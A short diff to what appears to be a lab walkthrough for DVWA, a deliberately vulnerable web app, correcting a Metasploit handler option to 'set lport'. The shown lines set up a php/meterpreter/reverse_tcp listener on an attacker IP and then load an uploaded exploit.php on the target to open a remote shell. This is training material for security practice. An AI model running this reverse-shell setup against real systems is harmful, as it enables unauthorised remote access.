@@ -91,7 +91,7 @@ msfconsole
 use exploit/multi/handler
 set payload php/meterpreter/reverse_tcp
 set lhost X.X.X.X (Parrot OS IP)
-set port 4444 (Default)
+set lport 4444 (Default)
 exploit
 
 Then upload and navigate tp page URL (http://<IPADDRESS>/DVWA/hackable/uploads/exploit.php)
